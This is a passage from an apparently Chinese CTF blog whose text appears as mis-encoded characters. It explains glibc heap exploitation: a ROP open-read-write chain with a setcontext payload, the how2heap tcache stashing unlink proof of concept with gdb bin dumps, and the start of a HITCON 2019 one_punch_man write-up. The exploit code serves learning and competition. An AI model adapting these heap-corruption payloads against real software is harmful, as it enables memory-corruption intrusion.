class="number">0x11c3b1</span></span><br><span class="line">read = libc_base + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write = libc_base + libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">ope = libc_base + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">ret = libc_base + <span class="number">0x256b9</span></span><br><span class="line"></span><br><span class="line">flag_addr = heap_base + <span class="number">0x720</span></span><br><span class="line">orw_addr = heap_base + <span class="number">0x740</span></span><br><span class="line"></span><br><span class="line">orw = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(ope)</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(heap_base) + p64(pop_rdx_r12) + p64(<span class="number">0x20</span>) + p64(<span class="number">0</span>) + p64(read)</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi) + p64(heap_base) + p64(pop_rdx_r12) + p64(<span class="number">0x20</span>) + p64(<span class="number">0</span>) + p64(write)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x150</span>)<span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x150</span>)<span class="comment">#7</span></span><br><span class="line">edit(<span class="number">5</span>,<span class="string">&#x27;./flag\x00\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">6</span>,orw)</span><br></pre></td></tr></table></figure>

<p>åœ¨åšé¢˜çš„æ—¶å€™è¿˜å‘ç°æœ‰äº›ç”¨libc.searchæ‰¾å‡ºæ¥çš„gadgetåœ¨æ²¡æœ‰æ‰§è¡Œæƒé™çš„libcæ®µé‡Œï¼Œå¯¼è‡´crashäº†ï¼Œä¹Ÿä¸çŸ¥é“æ˜¯å•¥æƒ…å†µï¼Œæ‰€ä»¥å¯èƒ½è¿˜æ˜¯ç”¨ropperä¹‹ç±»çš„æ‰¾å¥½ä¸€ç‚¹ã€‚</p>
<p>ç„¶åå°±æ˜¯æœ€åä¸€æ­¥ï¼Œæ§åˆ¶å¥½rdiçš„å€¼ï¼Œåœ¨ç›¸åº”åœ°å€å¸ƒç½®å¥½å¯¹åº”çš„å€¼å³å¯</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(heap_base+<span class="number">0x8b0</span>)<span class="comment">#rdi</span></span><br><span class="line">payload += p64(heap_base+<span class="number">0x8a0</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(setcontext+<span class="number">61</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(orw_addr)<span class="comment">#rsp</span></span><br><span class="line">payload += p64(ret)<span class="comment">#rcx</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">7</span>,payload)</span><br><span class="line">free(<span class="number">7</span>)</span><br></pre></td></tr></table></figure>

<p>ç¨å¾®è§£é‡Šä¸€ä¸‹ä¸Šé¢è¿™éƒ¨åˆ†ï¼Œfreeæ‰chunk7ä¹‹å<code>p64(heap_base+0x8b0)</code>ä¼šè¢«ä¼ ç»™rdiï¼Œ<code>[rdi - 8]</code>ä¹Ÿå°±æ˜¯<code>*(heap_base+0x8b0 - 8)</code>å¯¹åº”çš„å°±æ˜¯payloadä¸­çš„ç¬¬äºŒä¸ªp64ï¼Œè¿™ä¸ªå€¼ä¼šä¼ ç»™rdxã€‚ç„¶åå°±æ˜¯æ ¹æ®gadgetå‰©ä¸‹çš„éƒ¨åˆ†ä»¥åŠsetcontextçš„éƒ¨åˆ†æ¥å¸ƒç½®åœ°å€å³å¯ã€‚</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/05/16/tcache/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPtçš„Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/16/tcache/" class="post-title-link" itemprop="url">tcache</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-05-16 15:57:49" itemprop="dateCreated datePublished" datetime="2022-05-16T15:57:49+08:00">2022-05-16</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2022-05-20 18:17:03" itemprop="dateModified" datetime="2022-05-20T18:17:03+08:00">2022-05-20</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache stashing unlink attack"></a>tcache stashing unlink attack</h3><blockquote>
<p>è¿™ç§æ”»å‡»åˆ©ç”¨çš„æ˜¯ tcache bin æœ‰å‰©ä½™ (æ•°é‡å°äº <code>TCACHE_MAX_BINS</code> ) æ—¶ï¼ŒåŒå¤§å°çš„ small bin ä¼šæ”¾è¿› tcache ä¸­ (è¿™ç§æƒ…å†µå¯ä»¥ç”¨ <code>calloc</code> åˆ†é…åŒå¤§å°å †å—è§¦å‘ï¼Œå› ä¸º <code>calloc</code> åˆ†é…å †å—æ—¶ä¸ä» tcache bin ä¸­é€‰å–)ã€‚åœ¨è·å–åˆ°ä¸€ä¸ª <code>smallbin</code> ä¸­çš„ä¸€ä¸ª chunk åä¼šå¦‚æœ tcache ä»æœ‰è¶³å¤Ÿç©ºé—²ä½ç½®ï¼Œä¼šå°†å‰©ä½™çš„ small bin é“¾å…¥ tcache ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­åªå¯¹ç¬¬ä¸€ä¸ª bin è¿›è¡Œäº†å®Œæ•´æ€§æ£€æŸ¥ï¼Œåé¢çš„å †å—çš„æ£€æŸ¥ç¼ºå¤±ã€‚å½“æ”»å‡»è€…å¯ä»¥å†™ä¸€ä¸ª small bin çš„ bk æŒ‡é’ˆæ—¶ï¼Œå…¶å¯ä»¥åœ¨ä»»æ„åœ°å€ä¸Šå†™ä¸€ä¸ª libc åœ°å€ (ç±»ä¼¼ <code>unsorted bin attack</code> çš„æ•ˆæœ)ã€‚æ„é€ å¾—å½“çš„æƒ…å†µä¸‹ä¹Ÿå¯ä»¥åˆ†é… fake chunk åˆ°ä»»æ„åœ°å€ã€‚</p>
</blockquote>
<h4 id="how2heapä¸­çš„poc"><a href="#how2heapä¸­çš„poc" class="headerlink" title="how2heapä¸­çš„poc"></a>how2heapä¸­çš„poc</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *target;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;stack_var addr is:%p\n&quot;</span>,&amp;stack_var[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk_lis addr is:%p\n&quot;</span>,&amp;chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;target addr is:%p\n&quot;</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    </span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var;</span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"> </span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;target now: %p\n&quot;</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line">    </span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…·ä½“åŸç†å…¶å®å¼•è¨€é‡Œè¯´çš„å¾ˆæ¸…æ¥šï¼Œåªæ˜¯ç¬¬ä¸€æ¬¡çœ‹å¯èƒ½æ²¡é‚£ä¹ˆæ¸…æ¥šï¼Œè·Ÿç€pocèµ°ä¸€æ¬¡å°±çŸ¥é“æ˜¯ä»€ä¹ˆæ„æ€äº†</p>
<p>åˆ°ç¬¬29è¡Œä¸ºæ­¢ï¼Œbinç»“æ„å¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ bins</span><br><span class="line">tcachebins</span><br><span class="line">0xa0 [  7]: 0x602300 â€”â–¸ 0x602760 â€”â–¸ 0x6026c0 â€”â–¸ 0x602620 â€”â–¸ 0x602580 â—‚â€” ...</span><br><span class="line"></span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x602390 â€”â–¸ 0x602250 â€”â–¸ 0x7ffff7dcfca0 (main_arena+96) â—‚â€” 0x602390</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥<code>malloc(0xa0);</code>çš„ç›®çš„æ˜¯è§¦å‘malloc_consolidate()ï¼Œå°†unsorted binä¸­çš„chunkæ”¾åˆ°small binä¸­ï¼Œåç»­å†ä»tcacheä¸­å–å‡ºä¸¤ä¸ªchunk</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ bins</span><br><span class="line">tcachebins</span><br><span class="line">0xa0 [  5]: 0x6026c0 â€”â–¸ 0x602620 â€”â–¸ 0x602580 â€”â–¸ 0x6024e0 â€”â–¸ 0x602440 â—‚â€” ...</span><br><span class="line"></span><br><span class="line">smallbins</span><br><span class="line">0xa0: 0x602390 â€”â–¸ 0x602250 â€”â–¸ 0x7ffff7dcfd30 (main_arena+240) â—‚â€” 0x602390</span><br></pre></td></tr></table></figure>

<p>ç„¶å<code>chunk_lis[2][1] = (unsigned long)stack_var;</code>ï¼Œä¹Ÿå°±æ˜¯<code>*(*(chunk_lis[2]) + 8) = (unsigned long)stack_var</code>ï¼Œä¿®æ”¹äº†<code>chunk_lis[2]</code>æ‰€å¯¹åº”chunkçš„bkæŒ‡é’ˆï¼Œå¯¹åº”åˆ°ä¸Šå›¾ä¹Ÿå°±æ˜¯<code>0x602390</code>çš„bkæŒ‡é’ˆï¼Œæ­¤æ—¶small biné“¾è¡¨å˜æˆå¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ bins</span><br><span class="line">tcachebins</span><br><span class="line">0xa0 [  5]: 0x6026c0 â€”â–¸ 0x602620 â€”â–¸ 0x602580 â€”â–¸ 0x6024e0 â€”â–¸ 0x602440 â—‚â€” ...</span><br><span class="line"></span><br><span class="line">smallbins</span><br><span class="line">0xa0 [corrupted]</span><br><span class="line">FD: 0x602390 â€”â–¸ 0x602250 â€”â–¸ 0x7ffff7dcfd30 (main_arena+240) â—‚â€” 0x602390</span><br><span class="line">BK: 0x602250 â€”â–¸ 0x602390 â€”â–¸ 0x7fffffffdbf0 â€”â–¸ 0x7fffffffdc00 â—‚â€” 0x0</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥å› ä¸ºæ˜¯ç”¨callocæ¥ç”³è¯·çš„ï¼Œè€Œcallocä¸ä¼šé€‰å–tcacheä¸­çš„å †å—ï¼Œæ‰€ä»¥ä¹Ÿå°±æ˜¯ä»small binä¸­å–å‡º<code>0x602250</code>è¿™å—chunkï¼ˆFIFOï¼‰ï¼Œæ¥ä¸‹æ¥ï¼šâ‘  å› ä¸ºtcacheä¸­è¿˜æœ‰å‰©ä½™ä½ç½®ï¼Œæ‰€ä»¥small binä¸­å‰©ä¸‹çš„ä¸¤å—chunkä¼šè¢«æ”¾åˆ°tcacheä¸­ã€‚â‘¡ åœ¨â‘ çš„è¿‡ç¨‹ä¸­small binåªä¼šæ£€æŸ¥ç¬¬ä¸€ä¸ªchunkçš„å®Œæ•´æ€§ï¼Œä¹Ÿå°±æ˜¯<code>0x602390</code>ï¼Œè€Œä¸ä¼šå¯¹æˆ‘ä»¬ä¼ªé€ çš„chunkè¿›è¡Œæ£€æŸ¥</p>
<p>æ‰€ä»¥æœ€åæˆ‘ä»¬å°±é€šè¿‡è¿™æ ·çš„æ–¹å¼å°†æˆ‘ä»¬ä¼ªé€ çš„chunkæ”¾åˆ°äº†tcacheä¸Š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ bins</span><br><span class="line">tcachebins</span><br><span class="line">0xa0 [  7]: 0x7fffffffdc00 â€”â–¸ 0x6023a0 â€”â–¸ 0x6026c0 â€”â–¸ 0x602620 â€”â–¸ 0x602580 â—‚â€” ...</span><br><span class="line"></span><br><span class="line">smallbins</span><br><span class="line">0xa0 [corrupted]</span><br><span class="line">FD: 0x602390 â€”â–¸ 0x6026c0 â—‚â€” 0x0</span><br><span class="line">BK: 0x7fffffffdc00 â—‚â€” 0x0</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆä¸‹ä¸€æ¬¡<code>malloc(0x90);</code>å¾—åˆ°çš„å—å°±ç›´æ¥æ˜¯æˆ‘ä»¬ä¼ªé€ çš„å—äº†</p>
<h3 id="HITCON-2019-one-punch-man"><a href="#HITCON-2019-one-punch-man" class="headerlink" title="HITCON 2019 one_punch_man"></a>HITCON 2019 one_punch_man</h3><p>çŸ¥è¯†ç‚¹ï¼štcache stashing unlink attack</p>
<p>ï¼ˆlibc-2.29ï¼‰</p>
<h4 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h4><p>ç¨‹åºå¼€äº†æ²™ç®±ï¼Œè¦ç”¨orw</p>
<p>ç¨‹åºä¸€å¼€å§‹çš„æ“ä½œ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ptr = <span class="built_in">malloc</span>(<span class="number">0x1000</span>uLL);</span><br><span class="line"><span class="keyword">if</span> ( !ptr )</span><br><span class="line">  error(<span class="string">&quot;err&quot;</span>, a2);</span><br><span class="line">v3 = ptr;</span><br><span class="line"><span class="built_in">free</span>(ptr);</span><br><span class="line">qword_4030 = (ptr &amp; <span class="number">0xFFFFFFFFFFFFF000</span>LL) + <span class="number">16</span>;</span><br></pre></td></tr></table></figure>

<p>è¿™å‡ æ­¥ç›¸å½“äºå°†heap_base+0x10èµ‹å€¼ç»™äº†qword_4030ã€‚</p>
<p>èœå•ï¼Œåˆ†åˆ«å¯¹åº”addã€editã€showã€freeå››ä¸ªåŠŸèƒ½</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  sub_1B62(<span class="string">&quot;############################\n&quot;</span>);</span><br><span class="line">  sub_1B62(<span class="string">&quot;ğŸ‘¼     One Punch Man      ğŸ‘¼\n&quot;</span>);</span><br><span class="line">  sub_1B62(<span class="string">&quot;############################\n&quot;</span>);</span><br><span class="line">  sub_1B62(<span class="string">&quot;#   1. debut               #\n&quot;</span>);</span><br><span class="line">  sub_1B62(<span class="string">&quot;#   2. rename              #\n&quot;</span>);</span><br><span class="line">  sub_1B62(<span class="string">&quot;#   3. show                #\n&quot;</span>);</span><br><span class="line">  sub_1B62(<span class="string">&quot;#   4. retire              #\n&quot;</span>);</span><br><span class="line">  sub_1B62(<span class="string">&quot;#   5. Exit                #\n&quot;</span>);</span><br><span class="line">  sub_1B62(<span class="string">&quot;############################\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> sub_1B62(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>addåŠŸèƒ½å‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">add</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [rsp+8h] [rbp-418h]</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [rsp+Ch] [rbp-414h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">1032</span>]; <span class="comment">// [rsp+10h] [rbp-410h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+418h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_1B62(<span class="string">&quot;idx: &quot;</span>);</span><br><span class="line">  v3 = sub_1BF9();</span><br><span class="line">  <span class="keyword">if</span> ( v3 &gt; <span class="number">2</span> )</span><br><span class="line">    error(<span class="string">&quot;invalid&quot;</span>, a2);</span><br><span class="line">  sub_1B62(<span class="string">&quot;hero name: &quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x400</span>uLL);</span><br><span class="line">  size = read(<span class="number">0</span>, s, <span class="number">0x400</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( size &lt;= <span class="number">0</span> )</span><br><span class="line">    error(<span class="string">&quot;io&quot;</span>, s);</span><br><span class="line">  s[size - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( size &lt;= <span class="number">0x7F</span> || size &gt; <span class="number">0x400</span> )</span><br><span class="line">    error(<span class="string">&quot;poor hero name&quot;</span>, s);</span><br><span class="line">  qword_4040[<span class="number">2</span> * v3] = <span class="built_in">calloc</span>(<span class="number">1uLL</span>, size);</span><br><span class="line">  qword_4048[<span class="number">2</span> * v3] = size;</span><br><span class="line">  <span class="built_in">strncpy</span>(qword_4040[<span class="number">2</span> * v3], s, size);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x400</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åˆ«çš„åŠŸèƒ½å‡½æ•°æ²¡ä»€ä¹ˆç‰¹åˆ«çš„æ‰€ä»¥ä¸è´´äº†ï¼ŒfreeåŠŸèƒ½å‡½æ•°é‚£é‡Œæœ‰ä¸€ä¸ªuafæ¼æ´</p>
<p>ç¨‹åºä¸»é€»è¾‘ä¸­è¿˜ç»™äº†ä¸€ä¸ªåé—¨å‡½æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ( v4 == 0xC388 )</span><br><span class="line">  backdoor();</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">backdoor</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *buf; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *(qword_4030 + <span class="number">0x20</span>) &lt;= <span class="number">6</span> )</span><br><span class="line">    error(<span class="string">&quot;gg&quot;</span>, a2);</span><br><span class="line">  buf = <span class="built_in">malloc</span>(<span class="number">0x217</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !buf )</span><br><span class="line">    error(<span class="string">&quot;err&quot;</span>, a2);</span><br><span class="line">  <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, <span class="number">0x217</span>uLL) &lt;= <span class="number">0</span> )</span><br><span class="line">    error(<span class="string">&quot;io&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Serious Punch!!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;( ï¾ŸĞ”ï¾Ÿ)Ïƒå¼Œå¼Œå¼Œå¼Œå¼Œå¼Œå¼Œå¼Œå¼Œå¼Œå¼Œå¼Œå¼Œå¼Œå¼Œå¼Œå¼Œå¼Œå¼Œå¼ŒâŠƒ&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h4><p>è¿™é¢˜çš„é—®é¢˜å°±åœ¨äºaddåŠŸèƒ½å‡½æ•°ä¸­æ‰€åˆ†é…çš„chunkæ˜¯ç”¨callocå¾—åˆ°çš„ï¼Œè€Œcallocä¸ä¼šä»tcacheä¸­å–å—ï¼Œè¿™ä¹Ÿå°±æ„å‘³ç€å³ä¾¿æˆ‘ä»¬æœ‰uafï¼Œèƒ½å¤Ÿä¿®æ”¹tcache bin chunkçš„fdæŒ‡é’ˆï¼Œæˆ‘ä»¬ä¹Ÿæ²¡åŠæ³•åœ¨addåŠŸèƒ½å‡½æ•°ä¸­å°†ä¼ªé€ çš„chunkå–å‡ºæ¥ã€‚</p>
<p>æˆ‘ä»¬çœ‹åˆ°å…¶å®åé—¨å‡½æ•°æ‰€æä¾›çš„åŠŸèƒ½ä¹Ÿåªæ˜¯ç”¨mallocæ¥ç”³è¯·ä¸€ä¸ªchunkè€Œå·²ï¼Œä½†æ˜¯è¿™ä¸ªmallocå°±èƒ½è®©æˆ‘ä»¬å®ç°å°†tcacheä¸­çš„å‡å—å–å‡ºæ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜æ˜¯å¾—è¦ç”¨åˆ°è¿™ä¸ªåé—¨å‡½æ•°ã€‚é‚£ä¹ˆå¾ˆè‡ªç„¶å°±è¦æƒ³åˆ°æ€ä¹ˆæ»¡è¶³å®ƒçš„æ¡ä»¶<code>*(qword_4030 + 0x20) &gt; 6</code>ï¼Œ<code>qword_4030 + 0x20</code>ä¹Ÿå°±æ˜¯heap_base+0x30ï¼Œåœ¨åˆ«çš„wpé‡Œçœ‹åˆ°è¯´libc-2.29ä¸‹è¿™ä¸ªåœ°å€ä¿å­˜çš„æ˜¯tcacheä¸­0x20å¤§å°çš„chunkçš„ä¸ªæ•°ã€‚</p>
<p>æˆ‘ä»¬æƒ³è¦ä¿®æ”¹è¿™ä¸ªå€¼å…¶å®æ€»ç»“ä¸‹æ¥ä¼šæœ‰å¾ˆå¤šæ–¹æ³•ï¼Œä½†æ˜¯é¦–å…ˆå¾ˆè‡ªç„¶çš„ä¼šæƒ³åˆ°unsorted bin attackï¼Œè€Œç”±äºåœ¨libc-2.29ä¸‹å¯¹unsorted binçš„æ‹†é“¾å¢åŠ äº†å®Œæ•´æ€§æ£€æŸ¥ï¼Œä½¿å¾—unsorted bin attackæ— æ³•å†ä½¿ç”¨äº†ã€‚</p>
<p>æ—¢ç„¶è¿™é¢˜ç”¨äº†callocï¼Œé‚£ä¹ˆå°±å¯ä»¥å¾€tcache stashing unlink attackè¿™ä¸ªæ–¹å‘å»æƒ³ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ€»ä½“çš„æµç¨‹å°±æ˜¯ï¼š</p>
<ol>
